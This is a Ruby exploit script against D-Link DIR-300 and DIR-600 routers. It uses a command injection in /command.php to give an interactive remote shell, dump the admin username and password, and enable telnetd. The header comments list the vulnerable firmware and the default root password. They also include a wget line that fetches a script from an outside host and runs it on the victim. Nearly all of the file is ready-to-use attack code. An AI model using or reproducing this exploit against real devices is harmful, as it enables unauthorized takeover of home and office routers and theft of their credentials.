#!/usr/bin/env ruby
# D-Link Dir-600 & Dir-300 RCE Exploit
# By: Hood3dRob1n
#
# PIC: http://i.imgur.com/nrmRxLi.png
# PIC: http://i.imgur.com/jtMmCps.png
#
# ============ Vulnerable Firmware Releases - DIR-300: ============
#
# Firmware Version : 2.12 - 18.01.2012
# Firmware Version : 2.13 - 07.11.2012
#
# ============ Vulnerable Firmware Releases - DIR-600: ============
#
# Firmware-Version : 2.12b02 - 17/01/2012
# Firmware-Version : 2.13b01 - 07/11/2012
# Firmware-Version : 2.14b01 - 22/01/2013
#
# In response to vuln & PoC posted on PacketStorm, by Michael Messner:
# http://packetstormsecurity.com/files/120052/D-Link-DIR-600-DIR-300-Command-Execution-Bypass-Disclosure.html

#NOTE: Default root pasword for D-Link firmware is: 1234
#
# telnetd.sh => http://inf0rm3r.webuda.com/scripts/telnetd.sh
# wget http://inf0rm3r.webuda.com/scripts/telnetd.sh -o /tmp/telnetd.sh; chmod +x /tmp/telnetd.sh; ./tmp/telnetd.sh &
# telnet <victim> => should be running as r00t :p
#Full Telnet Support not implemented yet - just activate it, but im working on connection handling in ruby soon.....

#Std Needed------------>
require 'net/http'
require 'optparse'
#RubyGems Needed------------>
require 'rubygems'
require 'colorize'
#Party Rox------------>

trap("SIGINT") { puts "\n\nWARNING! CTRL+C Detected, Shutting things down and exiting program....".red ; exit 666; }

def randz(num)
	(0...num).map{ ('a'..'z').to_a[rand(26)] }.join
end

options = {}
optparse = OptionParser.new do |opts|
	opts.banner = "Usage:".light_red + "#{$0} ".white + "[".light_red + "OPTIONS".white + "]".light_red
	opts.separator ""
	opts.separator "EX:".light_red + " #{$0} -u 188.119.224.90 -m 0".white
	opts.separator "EX:".light_red + " #{$0} -u 188.119.224.90 -m 1".white
	opts.separator ""
	opts.separator "Options: ".light_red
	#setup argument options....
	opts.on('-t', '--target <URL>', "\n\tTarget IP of the D-Link Dir-300/600 Device".white) do |host|
		options[:method] = 1 #1 is straight RCE shell, 2 Enabble Telnet
		@target = host.chomp
	end
	opts.on('-p', '--port <PORT>', "\n\tTarget Port to use (80 => Default)".white) do |port|
		options[:port] = 1
		@port = port.chomp
	end
	opts.on('-m', '--mode <NUM>', "\n\tExploit Mode\n\t0 => Straight RCE Shell\n\t1 => Telnet Shell (for Dir-600 models)".white) do |mode|
		options[:mode] = 'set'
		@mode = mode.chomp
	end
	opts.on('-h', '--help', "\n\tHelp Menu".white) do 
		puts opts
		puts
		exit 69
	end
end
begin
	foo = ARGV[0] || ARGV[0] = "-h"
	optparse.parse!
	mandatory = [:method, :mode]
	missing = mandatory.select{ |param| options[param].nil? }
	if not missing.empty?
		puts "Missing or Unknown Options".red + "!".white
		puts optparse
		exit
	end
rescue OptionParser::InvalidOption, OptionParser::MissingArgument
	puts $!.to_s.red
	puts
	puts optparse
	puts
	exit 666;
end

if options[:port].nil?
	@port = 80
end

#Confirm Site is reachable First...
looper=0
while looper.to_i < 1
	puts
	puts "Confirming Site is up".light_red + "....".white
	begin
		http = Net::HTTP.new("#{@target}", "#{@port}")
		request = Net::HTTP::Get.new('/')
		response = http.request(request)
		if response.code == "200"
			puts "\t=> Site appears to be up".green + ".......".white
			puts
			puts "Checking for RCE vuln now".light_red + ".........".white
		else
			puts
			puts "Provided site and path don't seem to be working! Please double check and try again or check manually, sorry".light_red + ".......".white
			puts
			exit 666;
		end
		@rnd = randz(5)
		payload = "echo :#{@rnd}:working...check,check,1,2,3:#{@rnd}:"
		http = Net::HTTP.new("#{@target}", "#{@port}")
		request = Net::HTTP::Post.new('/command.php', { 'User-Agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:14.0) Gecko/20100101 Firefox/14.0.1' })
		request.body = "cmd=#{payload}"
		response = http.request(request)
		if response.body =~ /:#{@rnd}:(.+):#{@rnd}:/
			success = $1 #make results available
			puts "\t=> #{success}".light_green
			puts
		else
			puts "Injection doesn't appear to be working".light_red + "!".white
			puts
			puts "Check IP provided or check manually to confirm, sorry".light_red + ".......".white
			puts
			puts
			exit 666;
		end

		if @mode.to_i == 0
			# Start Loop to Simulate a Command Shell for user....
			foo=0
			while foo.to_i < 1
				begin
					print "RCE-Shell> ".light_green
					@cmd = gets.chomp
					@rnd = randz(5)
					@payload = "echo :#{@rnd}:; #{@cmd}; echo :#{@rnd}:"
					puts
					if "#{@cmd.upcase}" == "EXIT" or "#{@cmd.upcase}" == "QUIT"
						puts
						puts "OK, exiting RCE Shell session".light_red + "......".white
						puts
						exit 69;
					end
					http = Net::HTTP.new("#{@target}", "#{@port}")
					request = Net::HTTP::Post.new('/command.php', { 'User-Agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:14.0) Gecko/20100101 Firefox/14.0.1' })
					request.body = "cmd=#{@payload}"
					response = http.request(request)
					if response.body =~ /:#{@rnd}:\s(.+)\s:#{@rnd}:/
						success = $1 #make results available
						puts "#{success}".white
						puts
					else
						puts "Not finding results".light_red + "?".white
					end
				rescue Timeout::Error
					redo
				rescue Errno::ETIMEDOUT
					redo
				end
			end#End of Loop
		elsif @mode.to_i == 1
			puts "Confirm Dir-600 model".light_red + "....".white
			http = Net::HTTP.new("#{@target}", "#{@port}")
			request = Net::HTTP::Post.new('/command.php', { 'User-Agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:14.0) Gecko/20100101 Firefox/14.0.1' })
			@rnd = randz(5)
			@payload = "echo :#{@rnd}:; cat /var/passwd; cat /etc/config/image_sign; echo :#{@rnd}:"
			request.body = "cmd=#{@payload}"
			response = http.request(request)
			if response.body =~ /:#{@rnd}:\s(.+)\s(.+)\s(.+)\s(.+)\s:#{@rnd}:/
				@username = $1; @password = $2; @uid = $3; @model = $4;
				puts "UID".light_red + ": ".cyan + "#{@uid.sub('"', '').sub('"', '')}".white
				puts "USER".light_red + ": ".cyan + "#{@username.sub('"', '').sub('"', '')}".white
				puts "PASS".light_red + ": ".cyan + "#{@password.sub('"', '').sub('"', '')}".white
				puts "MODEL".light_red + ": ".cyan + "#{@model}".white
			end

			if not @model =~ /dir600/
				puts
				puts "Doesn't appear to be a Dir-600 model, which means Telnet might not be supported (not many success in testing on 300's for me, idk)".light_red + "!".white
				puts
				puts "Try the normal RCE Shell if it fails or confrim things manually to be sure".light_red + ".....".white
				puts
			end
			puts "Attempting Telnet Activation now".light_red + "....".white
			puts "Confirm by connecting via Telnet Client in".light_red + "3".light_red + "...".white + "2".light_red + "...".white + "1".light_red + "....".white
			http = Net::HTTP.new("#{@target}", '80')
			request = Net::HTTP::Post.new('/command.php', { 'User-Agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:14.0) Gecko/20100101 Firefox/14.0.1' })
			@rnd = randz(5)
			@payload = "echo :#{@rnd}:; telnetd; echo :#{@rnd}:"
			request.body = "cmd=#{@payload}"
			response = http.request(request)
			puts
			puts "OK, should be enabled now".light_red + ".....".white
			puts
		end
	rescue Errno::ECONNREFUSED
		puts "\t=> Connection Refused".red + "!".cyan
	rescue Errno::EHOSTUNREACH
		puts "\t=> Can't find provided Host! Check domain/IP and try again".red + "......".white
		exit 666;
	rescue EOFError
		puts "\t=> Problem reading Link!".red
		redo
	rescue Timeout::Error
		puts "\t=> Connection Timeout Issues".red + "!".cyan
	rescue Errno::ETIMEDOUT
		puts "\t=> Connection Timeout Issues".red + "!".white
	end
	break
end
